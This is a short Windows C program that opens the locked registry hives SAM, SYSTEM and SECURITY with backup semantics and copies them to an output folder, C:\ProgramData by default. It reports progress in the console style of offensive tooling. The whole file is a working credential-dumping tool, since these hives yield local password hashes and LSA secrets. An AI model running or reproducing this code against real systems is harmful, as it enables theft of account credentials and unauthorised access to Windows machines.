#include <windows.h>
#include <stdio.h>

BOOL BackupCopyFile(LPCSTR srcPath, LPCSTR dstPath) {
    HANDLE hSrc = CreateFileA(srcPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);

    if (hSrc == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile (src) failed for: %s: %lu\n", srcPath, GetLastError());
        return FALSE;
    }

    HANDLE hDst = CreateFileA(dstPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hDst == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile (dst) failed for: %s: %lu\n", dstPath, GetLastError());
        CloseHandle(hSrc);
        return FALSE;
    }

    BYTE buffer[4096];
    DWORD bytesRead = 0;
    DWORD bytesWritten = 0;
    BOOL success = TRUE;

    while (ReadFile(hSrc, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
        if (!WriteFile(hDst, buffer, bytesRead, &bytesWritten, NULL)) {
            printf("[-] File written failed %lu\n", GetLastError());
            success = FALSE;
            break;
        }
    }

    CloseHandle(hSrc);
    CloseHandle(hDst);

    if (success) {
        printf("[+] Copied %s -> %s\n", srcPath, dstPath);
    }

    return success;
}

int main(int argc, char* argv[]) {
    char outDir[MAX_PATH] = "C:\\ProgramData";

    if (argc >= 2) {
        strncpy(outDir, argv[1], MAX_PATH - 1);
        outDir[MAX_PATH - 1] = '\0';
    }

    printf("[*] Output directory: %s\n", outDir);

    const char* targets[][2] = {
        { "C:\\Windows\\System32\\config\\SAM", "SAM" },
        { "C:\\Windows\\System32\\config\\SYSTEM", "SYSTEM" },
        { "C:\\Windows\\System32\\config\\SECURITY", "SECURITY" }
    };

    int count = sizeof(targets) / sizeof(targets[0]);

    for (int i = 0; i < count; i++) {
        char dstPath[MAX_PATH];
        _snprintf(dstPath, MAX_PATH, "%s\\%s", outDir, targets[i][1]);
        BackupCopyFile(targets[i][0], dstPath);
    }

    printf("[*] Done.\n");
    return 0;
}
